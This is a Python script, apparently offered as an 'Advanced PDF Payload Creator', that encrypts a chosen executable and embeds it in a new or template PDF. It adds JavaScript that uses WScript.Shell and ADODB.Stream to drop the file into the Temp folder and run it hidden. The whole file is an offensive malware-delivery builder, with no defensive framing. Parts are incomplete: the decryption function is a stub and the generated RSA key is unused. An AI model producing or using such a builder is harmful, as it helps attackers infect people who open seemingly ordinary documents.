import base64
import os
import time
import random
import string
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from PyPDF2 import PdfWriter, PdfReader
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from io import BytesIO
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Initialize Rich Console
console = Console()

# Generate a symmetric Fernet key
def generate_symmetric_key():
    return Fernet.generate_key()

# Generate RSA keys
def generate_asymmetric_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key

# Encrypt with a symmetric key
def encrypt_payload(payload, key):
    cipher = Fernet(key)
    return cipher.encrypt(payload)

# Encrypt with an RSA public key
def encrypt_with_public_key(payload, public_key):
    encrypted = public_key.encrypt(
        payload,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

# Generate a random filename
def random_filename(extension=".exe"):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + extension

# Create a PDF with an embedded payload and custom or existing template
def create_pdf_with_payload(output_pdf_path, encrypted_payload, symmetric_key, template_pdf_path=None):
    try:
        output_pdf = PdfWriter()

        if template_pdf_path:
            with open(template_pdf_path, "rb") as template_file:
                template_pdf = PdfReader(template_file)
                for page_num in range(len(template_pdf.pages)):
                    output_pdf.add_page(template_pdf.pages[page_num])
        else:
            buffer = BytesIO()
            c = canvas.Canvas(buffer, pagesize=letter)
            c.setFont("Helvetica", 14)
            c.drawString(100, 750, "Confidential PDF with Embedded Payload")
            c.drawString(100, 720, "Handle with care.")
            c.save()
            buffer.seek(0)
            custom_pdf = PdfReader(buffer)
            output_pdf.add_page(custom_pdf.pages[0])

        # JavaScript payload execution script
        js_code = f"""
        var key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";
        var payload = "{base64.urlsafe_b64encode(encrypted_payload).decode()}";

        function decryptAndExecutePayload() {{
            var shell = new ActiveXObject("WScript.Shell");
            var tempPath = "C:\\\\Users\\\\YourUsername\\\\AppData\\\\Local\\\\Temp\\\\" + "{random_filename()}";
            var fileStream = new ActiveXObject("ADODB.Stream");
            fileStream.Type = 1; // Binary
            fileStream.Open();
            fileStream.Write(decryptPayload(payload, key));
            fileStream.SaveToFile(tempPath, 2);
            fileStream.Close();
            shell.Run(tempPath, 0);
        }}

        function decryptPayload(data, key) {{
            // Your decryption logic here
            return data;
        }}

        decryptAndExecutePayload();
        """

        output_pdf.add_js(js_code)

        with open(output_pdf_path, "wb") as f:
            output_pdf.write(f)
        console.print(f"[green]PDF with payload created successfully at {output_pdf_path}[/green]")

    except Exception as e:
        console.print(f"[red]Failed to create PDF: {str(e)}[/red]")

# File selection prompt
def select_file():
    Tk().withdraw()
    file_path = askopenfilename(filetypes=[
        ("Executable files", "*.exe"),
        ("Binary files", "*.bin"),
        ("All files", "*.*")
    ])
    return file_path

# Select an existing PDF template
def select_pdf_template():
    Tk().withdraw()
    file_path = askopenfilename(filetypes=[("PDF files", "*.pdf")])
    return file_path

# Read binary file content
def read_binary_file(file_path):
    with open(file_path, 'rb') as f:
        return f.read()

def main():
    console.print(Panel("[bold green]Advanced PDF Payload Creator[/bold green]", style="bold magenta", title="Welcome"))
    time.sleep(1)
    
    # Select a binary payload file
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected. Exiting.[/red]")
        return

    payload = read_binary_file(file_path)
    output_pdf_name = Prompt.ask("[cyan]Enter the name for the output PDF file (with .pdf extension)[/cyan]", default="advanced_payload.pdf")
    
    # Choose between custom or template PDF
    use_template = Prompt.ask("[cyan]Do you want to use an existing PDF as a template? (y/n)[/cyan]", default="n").lower() == 'y'
    template_pdf_path = select_pdf_template() if use_template else None

    # Generate encryption keys
    symmetric_key = generate_symmetric_key()
    private_key, public_key = generate_asymmetric_keys()

    # Encrypt the payload
    encrypted_payload = encrypt_payload(payload, symmetric_key)
    encrypted_symmetric_key = encrypt_with_public_key(symmetric_key, public_key)

    # Display progress
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3}%"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Creating PDF...", total=100)
        create_pdf_with_payload(output_pdf_name, encrypted_payload, symmetric_key, template_pdf_path)
        progress.update(task, advance=100)
    
    # Display final payload details in a table
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Property", style="dim")
    table.add_column("Value")
    table.add_row("Payload File", os.path.basename(file_path))
    table.add_row("Encrypted Payload (Base64)", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encryption Key (Base64)", base64.urlsafe_b64encode(symmetric_key).decode())
    table.add_row("Output PDF File", output_pdf_name)
    
    if use_template:
        table.add_row("Template PDF", os.path.basename(template_pdf_path))
    
    console.print(table)

if __name__ == "__main__":
    main()

